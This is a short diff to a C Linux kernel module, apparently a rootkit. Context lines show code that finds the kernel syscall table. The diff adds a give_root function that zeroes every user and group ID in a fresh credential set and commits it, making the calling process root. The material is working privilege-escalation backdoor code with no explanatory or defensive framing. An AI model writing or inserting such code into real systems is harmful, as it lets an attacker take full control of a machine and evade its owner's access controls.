@@ -75,3 +75,17 @@ void get_syscall_table(void)
     }
     printk(KERN_INFO "Found syscall table @ %p", syscall_table);
 }
+
+void give_root(void)
+{
+    struct cred *newcreds;
+    newcreds = prepare_creds();
+
+    printk(KERN_INFO "Giving root to %d", newcreds->uid.val);
+
+	newcreds->uid.val = newcreds->gid.val = 0;
+	newcreds->euid.val = newcreds->egid.val = 0;
+	newcreds->suid.val = newcreds->sgid.val = 0;
+	newcreds->fsuid.val = newcreds->fsgid.val = 0;
+    commit_creds(newcreds);
+}
